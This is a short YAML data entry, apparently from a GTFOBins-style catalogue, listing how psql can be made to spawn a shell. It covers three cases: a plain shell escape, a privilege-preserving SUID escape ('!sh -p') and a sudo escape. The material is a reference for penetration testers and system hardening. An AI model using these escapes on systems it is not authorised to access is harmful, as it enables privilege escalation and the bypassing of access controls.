---
functions:
  shell:
    - code: |
        psql
        \?
        !sh
  suid:
    - code: |
        psql
        \?
        !sh -p
  sudo:
    - code: |
        psql
        \?
        !sh
---
